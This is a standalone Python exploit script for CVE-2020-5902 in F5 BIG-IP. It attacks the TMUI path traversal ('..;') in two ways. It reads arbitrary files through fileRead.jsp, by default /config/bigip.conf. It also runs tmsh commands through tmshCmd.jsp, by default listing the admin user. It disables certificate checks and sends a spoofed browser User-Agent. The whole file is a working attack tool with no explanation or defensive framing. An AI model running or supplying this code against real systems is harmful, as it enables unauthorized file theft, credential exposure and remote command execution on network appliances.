#!/usr/bin/env python3

import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser(description='F5 Big-IP CVE-2020-5902')
    parser.add_argument('-t', '--target', type=str, required=True,
                        help='Specify the target host')
    parser.add_argument('-x', '--exploit', type=str, required=True, default='lfr',
                        help='Specify the exploit; lfr or rce')
    parser.add_argument('-c', '--command', type=str, required=False, default='list+auth+user+admin',
                        help='Specify the rce command to execute')
    parser.add_argument('-f', '--filename', type=str, required=False, default='/config/bigip.conf',
                        help='Specify the filename to fetch via lfr')
    args = parser.parse_args()

    if args.exploit == 'lfr':
        lfr_req(args)
    elif args.exploit == 'rce':
        rce_req(args)
    else: parser.error('Please specify exploit; lfr or rce.')

headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' }

def lfr_req(args):
    try:
        print(f'[*] Attempting to fetch {args.filename} from {args.target}')
        r = requests.get('https://{0}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName={1}'.format(args.target, args.filename), headers=headers, verify=False)
        if r.status_code == 200:
            print('[+] Target appears vulnerable!')
            print(f'{r.text}')
        else:
            print('[-] Target does not appear vulnerable!')
            print(f'{r} \n {r.text}')
    except requests.exceptions.HTTPError as errh:
        print ("[!] Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("[!] Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("[!] Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("[!] Unknown Error: ",err)

def rce_req(args):
    try:
        print(f'[*] Executing {args.command} on {args.target}')
        r = requests.get('https://{0}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command={1}'.format(args.target, args.command), headers=headers, verify=False)      
        if r.status_code == 200:
            print('[+] Target appears vulnerable!')
            print(f'{r.text}')
        else:
            print('[-] Target does not appear vulnerable!')
            print(f'{r} \n {r.text}')
    except requests.exceptions.HTTPError as errh:
        print ("[!] Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("[!] Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("[!] Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("[!] Unknown Error: ",err)

if __name__ == '__main__':
    main()
